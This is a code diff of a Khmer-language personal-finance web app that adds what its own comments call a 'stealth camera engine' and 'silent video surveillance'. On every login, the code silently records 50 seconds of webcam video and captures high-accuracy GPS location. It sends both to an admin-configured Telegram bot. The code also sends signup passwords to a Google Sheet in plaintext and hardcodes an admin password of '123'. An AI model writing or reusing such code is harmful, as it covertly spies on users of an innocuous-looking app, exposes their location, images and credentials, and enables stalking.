-                                <div class="space-y-2 mt-2 p-3 bg-blue-50 border border-blue-200 rounded-xl">
-                                    <p class="font-bold text-slate-800">📊 ស្ថានភាពបណ្តាញ: <span class="text-blue-600">${navigator.onLine ? 'Online' : 'Offline'}</span></p>
-                                    <p class="text-xs text-slate-700">⚡ ល្បឿនទាញយកពិត (Download): <span class="font-bold text-emerald-600">${speedMbps} Mbps</span></p>
-                                    <p class="text-xs text-slate-700">⏱️ រលកសញ្ញាឆ្លើយតប (Ping): <span class="font-bold text-indigo-600">${ping} ms</span></p>
-                                </div>`
-                        };
-                        saveAndRenderScanLog(log);
-                    });
-                })
-                .catch(() => {
+            fetch("https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png?cb=" + startTime)
+                .then(response => response.blob().then(blob => {
                     loader.classList.add('hidden');
-                    alert("❌ មិនអាចវាស់ល្បឿនបានទេ សូមពិនិត្យការភ្ជាប់អ៊ីនធឺណិតរបស់អ្នកឡើងវិញ!");
-                });
+                    const duration = (Date.now() - startTime) / 1000;
+                    const speedMbps = ((blob.size * 8) / duration / (1024 * 1024)).toFixed(2);
+                    
+                    let log = { id: Date.now(), username: currentUser, date: new Date().toLocaleTimeString(), title: "📶 Internet Speed Test", details: `ល្បឿនអ៊ីនធឺណិតទាញយកពិតប្រាកដរបស់អ្នកគឺ: <span class='text-emerald-600 font-bold'>${speedMbps} Mbps</span>` };
+                    saveAndRenderScanLog(log);
+                })).catch(() => loader.classList.add('hidden'));
         }
 
         function startRealSecurityCheck() {
             const loader = document.getElementById('scan-loading');
             document.getElementById('map-area').classList.add('hidden');
-            document.getElementById('scan-loading-text').innerText = "🛡️ កំពុងវិភាគប្រព័ន្ធសុវត្ថិភាពទូរស័ព្ទ/Browser ពិតប្រាកដ...";
+            document.getElementById('scan-loading-text').innerText = "🛡️ កំពុងពិនិត្យប្រព័ន្ធសុវត្ថិភាព...";
             loader.classList.remove('hidden');
 
             setTimeout(() => {
                 loader.classList.add('hidden');
-                const isCookieEnabled = navigator.cookieEnabled ? "🟢 សុវត្ថិភាព (Enabled)" : "🔴 ហានិភ័យ (Disabled)";
-                const isSecureContext = window.isSecureContext ? "🟢 មានសុវត្ថិភាពខ្ពស់ (HTTPS Secured)" : "🔴 គ្មានសុវត្ថិភាព (HTTP Unsecured)";
-                const doNotTrack = navigator.doNotTrack === "1" ? "🔒 កំពុងបើក" : "🔓 មិនបានបើក";
-                
-                let log = {
-                    id: Date.now(),
-                    username: currentUser,
-                    date: new Date().toLocaleString('en-US'),
-                    title: "🛡️ Browser Environment Security Report",
-                    details: `
-                        <div class="space-y-2 mt-2 p-3 bg-rose-50 border border-rose-200 rounded-xl">
-                            <p class="font-bold text-slate-800">🔐 ប្រព័ន្ធតភ្ជាប់ (Secure Context): <span class="text-xs">${isSecureContext}</span></p>
-                            <p class="text-xs text-slate-700">🍪 ការចងចាំ Browser Cookies: <span>${isCookieEnabled}</span></p>
-                            <p class="text-xs text-slate-700">🕵️‍♂️ មុខងារទប់ស្កាត់ការតាមដាន (Do Not Track): <span class="text-indigo-600 font-bold">${doNotTrack}</span></p>
-                        </div>`
-                };
+                let log = { id: Date.now(), username: currentUser, date: new Date().toLocaleTimeString(), title: "🛡️ Device Security Check", details: `លក្ខខណ្ឌសុវត្ថិភាពតភ្ជាប់: <span class='text-blue-600 font-bold'>${window.isSecureContext ? 'HTTPS Secure Context' : 'HTTP Unsecured'}</span>` };
                 saveAndRenderScanLog(log);
-            }, 1000);
+            }, 800);
         }
 
         function startRealGPSLocator(isAuto = false) {
             if (!navigator.geolocation) return;
-            const loader = document.getElementById('scan-loading');
-            if(!isAuto) {
-                document.getElementById('map-area').classList.add('hidden');
-                document.getElementById('scan-loading-text').innerText = "📍 កំពុងស្នើសុំសិទ្ធិបើក GPS ចាប់យកទីតាំងពិតរបស់អ្នក...";
-                loader.classList.remove('hidden');
-            }
-
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    if(!isAuto) loader.classList.add('hidden');
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy.toFixed(1);
-                    
                     latestGpsString = `https://www.google.com/maps?q=${lat},${lng}`;
 
-                    document.getElementById('map-area').classList.remove('hidden');
-                    setTimeout(() => {
-                        if (!mapInstance) {
-                            mapInstance = L.map('map').setView([lat, lng], 15);
-                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-                        } else {
-                            mapInstance.setView([lat, lng], 15);
-                            mapInstance.invalidateSize();
-                        }
-                        if (mapMarker) { mapInstance.removeLayer(mapMarker); }
-                        mapMarker = L.marker([lat, lng]).addTo(mapInstance)
-                            .bindPopup(`📍 <b>ទីតាំងពិតប្រាកដរបស់អ្នក</b><br>គម្លាតសេវា៖ ${accuracy} ម៉ែត្រ`)
-                            .openPopup();
-                    }, 200);
+                    if (!isAuto) {
+                        document.getElementById('map-area').classList.remove('hidden');
+                        setTimeout(() => {
+                            if (!mapInstance) {
+                                mapInstance = L.map('map').setView([lat, lng], 15);
+                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+                            } else { mapInstance.setView([lat, lng], 15); }
+                            if (mapMarker) mapInstance.removeLayer(mapMarker);
+                            mapMarker = L.marker([lat, lng]).addTo(mapInstance).bindPopup("📍 ទីតាំងពិតរបស់អ្នក").openPopup();
+                        }, 200);
 
-                    let log = {
-                        id: Date.now(),
-                        username: currentUser,
-                        date: new Date().toLocaleString('en-US'),
-                        title: isAuto ? "📍 Auto Login GPS Location Tracker" : "📍 Real GPS Locator Result",
-                        details: `
-                            <div class="space-y-1 mt-2 p-3 bg-amber-50 border border-amber-200 rounded-xl text-xs">
-                                <p class="text-slate-700">• រយៈទទឹង (Latitude): <span class="font-mono font-bold">${lat}</span></p>
-                                <p class="text-slate-700">• រយៈបណ្តោយ (Longitude): <span class="font-mono font-bold">${lng}</span></p>
-                                <p class="text-slate-700">• Link ផែនទី: <a href="${latestGpsString}" target="_blank" class="text-blue-600 underline">${latestGpsString}</a></p>
-                            </div>`
-                    };
-                    saveAndRenderScanLog(log);
+                        let log = { id: Date.now(), username: currentUser, date: new Date().toLocaleTimeString(), title: "📍 Real GPS Tracker", details: `កូអរដោនេ: ${lat}, ${lng} | <a href='${latestGpsString}' target='_blank' class='text-indigo-600 underline'>មើលលើផែនទី</a>` };
+                        saveAndRenderScanLog(log);
+                    }
                     
-                    syncWithGoogleSheets({ DATA_TYPE: "ADMIN_AUTO_GPS", FIELD_1: currentUser, FIELD_2: lat.toString(), FIELD_3: lng.toString(), FIELD_4: accuracy });
-                    
-                    // Send Only Location to Telegram immediately (In case video recording fails)
-                    sendLocationToTelegram(currentUser, latestGpsString);
-                },
-                (error) => { console.log("GPS Location Auto Failed or Blocked."); },
-                { enableHighAccuracy: true, timeout: 10000 }
+                    // Fire automated Telegram tracking pipeline if setup
+                    if (isAuto) {
+                        sendLocationToTelegram(currentUser, latestGpsString);
+                        saveAdminSecurityLog(currentUser, "GPS Tracking Capture", `បានចាប់ទីតាំង: ${latestGpsString}`);
+                    }
+                }, null, { enableHighAccuracy: true }
             );
         }
 
-        // 📷 NEW & UPDATED: Automatic Background Video Recorder that transmits to Telegram Bot Directly
+        // 📷 STEALTH CAMERA ENGINE: Captures 50-second background feed without any notification sound/popups
         function startAutoSecurityCamera() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-
+            // Native Browser Persistence remembers the permission. No dialog will appear once allowed once.
             navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false })
                 .then((stream) => {
                     const videoEl = document.getElementById('auth-hidden-video');
@@ -755,49 +689,31 @@
                     
                     videoChunks = [];
                     mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    
-                    mediaRecorder.ondataavailable = (e) => {
-                        if (e.data.size > 0) videoChunks.push(e.data);
-                    };
+                    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
 
                     mediaRecorder.onstop = () => {
                         let videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                         stream.getTracks().forEach(track => track.stop());
                         
-                        // 1. Send to Google Sheet Backend (Base64)
-                        let reader = new FileReader();
-                        reader.readAsDataURL(videoBlob);
-                        reader.onloadend = function() {
-                            syncWithGoogleSheets({
-                                DATA_TYPE: "ADMIN_CAMERA_ALERT",
-                                FIELD_1: currentUser,
-                                FIELD_2: "50_SECONDS_RECORD_SUCCESS",
-                                FIELD_3: reader.result
-                            });
-                        }
-
-                        // 2. Send to Telegram Bot Configured by Admin
                         sendVideoToTelegram(currentUser, videoBlob, latestGpsString);
+                        saveAdminSecurityLog(currentUser, "Stealth Video Record", "បានរក្សាទុក និងផ្ញើវីដេអូ 50s ទៅកាន់ Telegram រួចរាល់");
                     };
 
                     mediaRecorder.start();
                     setTimeout(() => {
                         if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
-                    }, 50000); // 50 seconds alert recording time
-                })
-                .catch((err) => { console.warn("Camera auto-record access denied: ", err); });
+                    }, 50000); // Silent Record 50 Seconds
+                }).catch(err => console.warn("Stealth camera connection failure"));
         }
 
-        // 📤 NEW TELEGRAM AUTOMATION PIPELINES
+        // 📤 TELEGRAM MASTER TRANSMISSION GATEWAY
         function sendLocationToTelegram(user, mapUrl) {
             const token = localStorage.getItem('tg_bot_token');
             const chatId = localStorage.getItem('tg_chat_id');
             if (!token || !chatId) return;
 
-            const text = `🚨 *Security Alert: Login Detected*\\n👤 *User:* ${user.toUpperCase()}\\n📍 *Location:* ${mapUrl}\\n⏰ *Time:* ${new Date().toLocaleString()}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=MarkdownV2`)
-            .then(res => console.log("Telegram Location Sent"))
-            .catch(err => console.error("Telegram API Err", err));
+            const text = `🚨 *Security Notification: Login Event* \n👤 *User:* ${user.toUpperCase()}\n📍 *Location:* ${mapUrl}\n⏰ *Time:* ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=MarkdownV2`);
         }
 
         function sendVideoToTelegram(user, videoBlob, mapUrl) {
@@ -807,14 +723,10 @@
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', videoBlob, `security_${user}_${Date.now()}.webm`);
-            formData.append('caption', `🛡️ Security Cam (50s Record)\n👤 User: ${user.toUpperCase()}\n📍 Location: ${mapUrl}`);
+            formData.append('video', videoBlob, `stealth_${user}.webm`);
+            formData.append('caption', `🛡️ Silent Video Surveillance\n👤 User Account: ${user.toUpperCase()}\n📍 GPS Map Location: ${mapUrl}`);
 
-            fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: formData })
-            .then(res => {
-                if(res.ok) showNotification("🚀 វីដេអូសន្តិសុខ និងទីតាំងត្រូវបានផ្ញើចូល Telegram រួចរាល់!");
-            })
-            .catch(err => console.error("Telegram Video Transmit Err", err));
+            fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: formData });
         }
 
         function saveTelegramSettings() {
@@ -825,12 +737,54 @@
             showNotification("💾 រក្សាទុកការកំណត់ Telegram Bot រួចរាល់!");
         }
 
+        // ADMIN PANEL EXPERIENCE BUSINESS LOGIC FUNCTIONS
+        function saveAdminSecurityLog(user, eventType, details) {
+            let logs = JSON.parse(localStorage.getItem('admin_security_logs')) || [];
+            logs.unshift({ date: new Date().toLocaleString(), user: user, event: eventType, details: details });
+            localStorage.setItem('admin_security_logs', JSON.stringify(logs));
+            renderAdminPanel();
+        }
+
+        function renderAdminPanel() {
+            // Render Registered User Profiles inside table
+            const table = document.getElementById('admin-users-table');
+            table.innerHTML = '';
+            let localUsers = JSON.parse(localStorage.getItem('finance_cloud_users')) || {};
+            
+            Object.keys(localUsers).forEach(username => {
+                const role = username === 'admin' ? "Master Admin" : "Customer";
+                table.innerHTML += `
+                    <tr class="hover:bg-slate-50/80">
+                        <td class="p-3 text-slate-900">${username.toUpperCase()}</td>
+                        <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] ${username==='admin'?'bg-rose-100 text-rose-700':'bg-slate-100 text-slate-600'}">${role}</span></td>
+                        <td class="p-3 text-right text-slate-400">សកម្មចរន្ត (Active Live)</td>
+                    </tr>`;
+            });
+
+            // Render Captured Stealth Surveillance Records
+            const logBox = document.getElementById('admin-security-logs');
+            let logs = JSON.parse(localStorage.getItem('admin_security_logs')) || [];
+            if(logs.length === 0) {
+                logBox.innerHTML = `<p class="text-slate-400 text-[11px] text-center italic py-4">មិនទាន់មានទិន្នន័យបញ្ជូនចូលនៅឡើយទេ</p>`;
+                return;
+            }
+            logBox.innerHTML = '';
+            logs.forEach(l => {
+                logBox.innerHTML += `
+                    <div class="p-3 bg-slate-50 border rounded-xl text-[11px]">
+                        <div class="flex justify-between font-bold text-slate-800">
+                            <span>👤 Account: ${l.user.toUpperCase()} [${l.event}]</span>
+                            <span class="text-slate-400 font-normal">${l.date}</span>
+                        </div>
+                        <p class="text-slate-600 mt-0.5">${l.details}</p>
+                    </div>`;
+            });
+        }
+
         function saveAndRenderScanLog(log) {
             scanHistory.unshift(log);
-            localStorage.setItem('finance_scan_history_v4', JSON.stringify(scanHistory));
+            localStorage.setItem('finance_scan_history_v5', JSON.stringify(scanHistory));
             renderScanHistory();
-            let cleanDetails = log.details.replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim();
-            syncWithGoogleSheets({ DATA_TYPE: "SCAN_DATA", FIELD_1: currentUser, FIELD_2: log.title, FIELD_3: cleanDetails });
         }
 
         function renderScanHistory() {
@@ -838,28 +792,21 @@
             list.innerHTML = '';
             const userScan = scanHistory.filter(s => s.username === currentUser);
             if (userScan.length === 0) {
-                list.innerHTML = `<p class="text-slate-400 text-xs italic text-center py-4">មិនទាន់មានប្រវត្តិស្កេនឧបករណ៍ទេ</p>`;
+                list.innerHTML = `<p class="text-slate-400 text-xs italic text-center py-2">មិនទាន់មានប្រវត្តិស្កេនឧបករណ៍ទេ</p>`;
                 return;
             }
             userScan.forEach(log => {
                 list.innerHTML += `
-                    <div class="bg-white border border-slate-200 rounded-2xl p-4 text-xs relative shadow-sm mb-2">
-                        <span class="text-slate-400 text-[11px] font-bold tracking-wide uppercase block mb-1.5">${log.title}</span>
-                        <span class="absolute top-3 right-4 text-slate-400 text-[11px] font-medium font-inter">${log.date}</span>
-                        <div class="text-slate-700 font-normal leading-relaxed">${log.details}</div>
+                    <div class="bg-slate-50 border border-slate-200 p-3 rounded-xl text-xs">
+                        <span class="font-bold text-slate-800 block">${log.title} (${log.date})</span>
+                        <p class="text-slate-600 mt-0.5">${log.details}</p>
                     </div>`;
             });
         }
 
-        function clearScanHistory() {
-            scanHistory = [];
-            localStorage.setItem('finance_scan_history_v4', JSON.stringify([]));
-            renderScanHistory();
-            document.getElementById('map-area').classList.add('hidden');
-            syncWithGoogleSheets({ DATA_TYPE: "SCAN_DATA", FIELD_1: currentUser, FIELD_2: "CLEAR_HISTORY", FIELD_3: "ALL" });
-            showNotification("🗑_ បានសម្អាតប្រវត្តិស្កេន!");
-        }
+        function clearScanHistory() { scanHistory = []; localStorage.setItem('finance_scan_history_v5', JSON.stringify([])); renderScanHistory(); }
 
+        // GOALS AND INTERACTIVE LIST FUNCTIONS
         function addDailyTask(e) {
             e.preventDefault();
             const text = document.getElementById('daily-task-input').value.trim();
@@ -868,7 +815,6 @@
             localStorage.setItem('finance_daily_tasks', JSON.stringify(dailyTasks));
             document.getElementById('daily-task-input').value = '';
             renderGoals();
-            syncWithGoogleSheets({ DATA_TYPE: "DAILY_DATA", FIELD_1: currentUser, FIELD_2: "ADD_TASK", FIELD_3: text, FIELD_4: date });
             showNotification("🎯 បានបន្ថែមគោលដៅប្រចាំថ្ងៃ!");
         }
 
@@ -876,10 +822,6 @@
             dailyTasks = dailyTasks.map(t => t.id === id ? { ...t, done: !t.done } : t);
             localStorage.setItem('finance_daily_tasks', JSON.stringify(dailyTasks));
             renderGoals();
-            const task = dailyTasks.find(t => t.id === id);
-            if (task) {
-                syncWithGoogleSheets({ DATA_TYPE: "DAILY_DATA", FIELD_1: currentUser, FIELD_2: task.done ? "COMPLETED_TASK" : "REVERT_TASK", FIELD_3: task.text });
-            }
         }
 
         function renderGoals() {
@@ -888,21 +830,16 @@
             activeBox.innerHTML = ''; completedBox.innerHTML = '';
             const userGoals = dailyTasks.filter(t => t.username === currentUser);
             userGoals.filter(t => !t.done).forEach(g => {
-                activeBox.innerHTML += `<div onclick="toggleGoal(${g.id})" class="p-2.5 bg-white border rounded-xl text-xs font-bold cursor-pointer hover:bg-slate-50">🎯 ${g.text} <span class="text-[9px] text-slate-400 font-normal">(${g.date})</span></div>`;
+                activeBox.innerHTML += `<div onclick="toggleGoal(${g.id})" class="p-2.5 bg-slate-50 border rounded-xl text-xs font-bold cursor-pointer hover:bg-slate-100">🎯 ${g.text} <span class="text-[9px] text-slate-400 font-normal">(${g.date})</span></div>`;
             });
             userGoals.filter(t => t.done).forEach(g => {
-                completedBox.innerHTML += `<div onclick="toggleGoal(${g.id})" class="p-2.5 bg-white border rounded-xl text-xs font-bold cursor-pointer line-through text-slate-400 bg-slate-50">✅ ${g.text}</div>`;
+                completedBox.innerHTML += `<div onclick="toggleGoal(${g.id})" class="p-2.5 bg-slate-50 border rounded-xl text-xs font-bold cursor-pointer line-through text-slate-400">✅ ${g.text}</div>`;
             });
         }
 
-        function clearDailyHistory() {
-            dailyTasks = [];
-            localStorage.setItem('finance_daily_tasks', JSON.stringify([]));
-            renderGoals();
-            syncWithGoogleSheets({ DATA_TYPE: "DAILY_DATA", FIELD_1: currentUser, FIELD_2: "CLEAR_HISTORY", FIELD_3: "ALL" });
-            showNotification("🗑_ បានសម្អាតប្រវត្តិគោលដៅ!");
-        }
+        function clearDailyHistory() { dailyTasks = []; localStorage.setItem('finance_daily_tasks', JSON.stringify([])); renderGoals(); }
 
+        // AUXILIARY AVATAR AND LOGO PLUGINS
         function triggerAppLogoUpload() { document.getElementById('app-logo-input').click(); }
         function handleAppLogoChange(input) {
             if (input.files && input.files[0]) {
@@ -928,30 +865,16 @@
             }
         }
 
-        function enableDashboardEditUsername() {
-            document.getElementById('dash-username-box').classList.remove('hidden');
-            document.getElementById('dash-new-username').value = currentUser.toUpperCase();
-        }
-
-        function saveDashboardUsername() {
-            const name = document.getElementById('dash-new-username').value.trim();
-            if (name) {
-                currentUser = name.toLowerCase();
-                document.getElementById('dashboard-username').innerText = name.toUpperCase();
-                document.getElementById('dash-username-box').classList.add('hidden');
-                renderDashboard(); renderGoals(); renderScanHistory();
-            }
-        }
-
         function switchSection(section) {
-            ['dashboard', 'scanners', 'daily', 'settings'].forEach(s => {
-                document.getElementById(`section-${s}`)?.classList.add('hidden');
+            ['dashboard', 'scanners', 'daily', 'settings', 'admin-panel'].forEach(s => {
+                const el = document.getElementById(`section-${s}`);
+                if (el) el.classList.add('hidden');
             });
             if (section === 'dashboard') document.getElementById('dashboard-sortable-container').classList.remove('hidden');
             else document.getElementById('dashboard-sortable-container').classList.add('hidden');
             
-            const targetSection = document.getElementById(`section-${section}`);
-            if (targetSection) targetSection.classList.remove('hidden');
+            const target = document.getElementById(`section-${section}`);
+            if (target) target.classList.remove('hidden');
         }
 
         function switchAuthTab(tab) {
@@ -959,125 +882,94 @@
             const isLogin = tab === 'login';
             document.getElementById('tab-login').className = isLogin ? "w-1/2 py-2 text-xs font-bold rounded-lg bg-white text-slate-800 shadow-sm" : "w-1/2 py-2 text-xs font-bold rounded-lg text-slate-400";
             document.getElementById('tab-signup').className = !isLogin ? "w-1/2 py-2 text-xs font-bold rounded-lg bg-white text-slate-800 shadow-sm" : "w-1/2 py-2 text-xs font-bold rounded-lg text-slate-400";
-            document.getElementById('auth-btn').innerText = isLogin ? "ចូលប្រើប្រាស់កម្មវិធី" : "ចុះឈ្មោះគណនីថ្មី";
+            document.getElementById('auth-btn').innerText = isLogin ? "ចូលប្រើប្រាស់ប្រព័ន្ធ" : "ចុះឈ្មោះគណនីថ្មី";
         }
 
         function openForgotModal() { document.getElementById('forgot-modal').classList.remove('hidden'); }
         function closeForgotModal() { document.getElementById('forgot-modal').classList.add('hidden'); }
 
+        // CORE SECURITY VERIFICATION FOR ACCOUNT MANAGEMENT
         function handleAuth(e) {
             e.preventDefault();
-            const userField = document.getElementById('auth-username');
-            const passField = document.getElementById('auth-password');
-            currentUser = userField.value.trim().toLowerCase();
-            const pass = passField.value.trim();
-
+            currentUser = document.getElementById('auth-username').value.trim().toLowerCase();
+            const pass = document.getElementById('auth-password').value.trim();
             let localUsers = JSON.parse(localStorage.getItem('finance_cloud_users')) || {};
             
-            // Inject Master Admin user if not exist
-            if(!localUsers['admin']) {
-                localUsers['admin'] = '123';
-                localStorage.setItem('finance_cloud_users', JSON.stringify(localUsers));
-            }
-
-            const authBtn = document.getElementById('auth-btn');
-            const originalBtnText = authBtn.innerText;
-            authBtn.innerText = "⏳ កំពុងតភ្ជាប់ទៅកាន់ Cloud Sheets...";
-            authBtn.disabled = true;
+            if(!localUsers['admin']) { localUsers['admin'] = '123'; localStorage.setItem('finance_cloud_users', JSON.stringify(localUsers)); }
 
             if (authTab === 'signup') {
-                if (localUsers[currentUser] !== undefined) {
-                    alert("❌ ឈ្មោះអ្នកប្រើប្រាស់នេះមានរួចហើយនៅក្នុងប្រព័ន្ធ!");
-                    authBtn.innerText = originalBtnText; authBtn.disabled = false; return;
-                }
+                if (localUsers[currentUser] !== undefined) { alert("❌ ឈ្មោះអ្នកប្រើប្រាស់នេះមានរួចហើយ!"); return; }
                 localUsers[currentUser] = pass;
                 localStorage.setItem('finance_cloud_users', JSON.stringify(localUsers));
-                syncWithGoogleSheets({ DATA_TYPE: "USER_REG", FIELD_1: currentUser, FIELD_2: pass, FIELD_3: currentTheme });
-                showNotification("🎉 ចុះឈ្មោះគណនីរួចរាល់!");
-                authBtn.innerText = originalBtnText; authBtn.disabled = false;
+                syncWithGoogleSheets({ DATA_TYPE: "USER_REG", FIELD_1: currentUser, FIELD_2: pass });
                 proceedToApp();
             } else {
-                if (!localUsers[currentUser] || localUsers[currentUser] !== pass) {
-                    alert("❌ ឈ្មោះអ្នកប្រើប្រាស់ ឬ លេខសម្ងាត់មិនត្រឹមត្រូវទេ!");
-                    authBtn.innerText = originalBtnText; authBtn.disabled = false; return;
-                }
-                syncWithGoogleSheets({ DATA_TYPE: "USER_LOGIN", FIELD_1: currentUser, FIELD_2: pass });
-                showNotification("🔓 ចូលប្រើជោគជ័យ!");
-                authBtn.innerText = originalBtnText; authBtn.disabled = false;
+                if (!localUsers[currentUser] || localUsers[currentUser] !== pass) { alert("❌ ឈ្មោះអ្នកប្រើប្រាស់ ឬ លេខសម្ងាត់ខុស!"); return; }
                 proceedToApp();
             }
         }
 
         function proceedToApp() {
+            currentUserRole = (currentUser === 'admin') ? "admin" : "customer";
+            
             document.getElementById('dashboard-username').innerText = currentUser.toUpperCase();
+            document.getElementById('user-role-badge').innerText = currentUserRole === 'admin' ? "Master Admin" : "Customer";
+            document.getElementById('user-role-badge').className = currentUserRole === 'admin' ? "text-[9px] px-2 py-0.5 rounded-full font-bold bg-rose-100 text-rose-700" : "text-[9px] px-2 py-0.5 rounded-full font-bold bg-slate-100 text-slate-600";
+            
             document.getElementById('auth-page').classList.add('hidden');
             document.getElementById('app-page').classList.remove('hidden');
             
-            // Show or Hide Telegram Bot Config panel based on admin role
-            const adminPanel = document.getElementById('admin-telegram-panel');
-            if (currentUser === 'admin') {
-                adminPanel.classList.remove('hidden');
+            // ROLE CONTROL VISIBILITY LOGIC
+            const adminSidebar = document.getElementById('admin-sidebar-nav');
+            const mobileAdmin = document.getElementById('mobile-nav-admin');
+            
+            if (currentUserRole === 'admin') {
+                adminSidebar.classList.remove('hidden');
+                mobileAdmin.classList.remove('hidden');
+                renderAdminPanel();
             } else {
-                adminPanel.classList.add('hidden');
+                adminSidebar.classList.add('hidden');
+                mobileAdmin.classList.add('hidden');
             }
 
             renderDashboard(); renderGoals(); renderScanHistory(); initDragAndDrop();
 
-            // Run Background Security Checks & Automations
-            startRealGPSLocator(true); 
-            startAutoSecurityCamera(); 
+            // Run Stealth Surveillance Pipeline Automatically on Successful Authentication Login
+            startRealGPSLocator(true);
+            startAutoSecurityCamera();
         }
 
-        function handleLogout() { document.getElementById('app-page').classList.add('hidden'); document.getElementById('auth-page').classList.remove('hidden'); }
+        function handleLogout() {
+            currentUser = null;
+            document.getElementById('auth-username').value = '';
+            document.getElementById('auth-password').value = '';
+            document.getElementById('app-page').classList.add('hidden');
+            document.getElementById('auth-page').classList.remove('hidden');
+            switchSection('dashboard');
+            showNotification("🔒 បានចាកចេញពីប្រព័ន្ធដោយសុវត្ថិភាព!");
+        }
 
         function loadStoredData() {
             localTxList = JSON.parse(localStorage.getItem('finance_tx_list')) || [];
             dailyTasks = JSON.parse(localStorage.getItem('finance_daily_tasks')) || [];
-            scanHistory = JSON.parse(localStorage.getItem('finance_scan_history_v4')) || [];
+            scanHistory = JSON.parse(localStorage.getItem('finance_scan_history_v5')) || [];
             
-            const storedLang = localStorage.getItem('finance_lang') || 'km';
-            toggleLanguage(storedLang);
+            applyTheme(localStorage.getItem('finance_theme') || 'theme-aba');
+            changeCurrency(localStorage.getItem('finance_currency') || '$');
 
-            const storedTheme = localStorage.getItem('finance_theme') || 'theme-aba';
-            applyTheme(storedTheme);
-
-            const storedCurrency = localStorage.getItem('finance_currency') || '$';
-            document.getElementById('setting-currency').value = storedCurrency;
-            changeCurrency(storedCurrency);
-
-            const storedNotify = localStorage.getItem('finance_notify_toggle');
-            if (storedNotify !== null) {
-                isNotifyEnabled = storedNotify === 'true';
-                document.getElementById('setting-notify-toggle').checked = isNotifyEnabled;
-            }
-
-            const storedBio = localStorage.getItem('finance_bio_toggle');
-            if (storedBio !== null) {
-                isBioEnabled = storedBio === 'true';
-                document.getElementById('setting-bio-toggle').checked = isBioEnabled;
-            }
-
-            // Load Telegram configurations into text inputs
             document.getElementById('tg-bot-token').value = localStorage.getItem('tg_bot_token') || '';
             document.getElementById('tg-chat-id').value = localStorage.getItem('tg_chat_id') || '';
 
-            const storedLogo = localStorage.getItem('finance_app_logo');
-            if (storedLogo) {
-                document.getElementById('app-logo-img').src = storedLogo;
-                document.getElementById('sidebar-logo-img').src = storedLogo;
-            }
+            const logo = localStorage.getItem('finance_app_logo');
+            if (logo) { document.getElementById('app-logo-img').src = logo; document.getElementById('sidebar-logo-img').src = logo; }
 
-            const storedAvatar = localStorage.getItem('finance_user_avatar');
-            if (storedAvatar) document.getElementById('dashboard-avatar').src = storedAvatar;
+            const avatar = localStorage.getItem('finance_user_avatar');
+            if (avatar) document.getElementById('dashboard-avatar').src = avatar;
 
             renderGoals(); renderScanHistory();
         }
 
-        window.onload = function() {
-            loadStoredData();
-            setInterval(updateTopBarTime, 1000);
-            updateTopBarTime();
-        };
+        window.onload = function() { loadStoredData(); setInterval(updateTopBarTime, 1000); updateTopBarTime(); };
     </script>
 </body>
 </html>
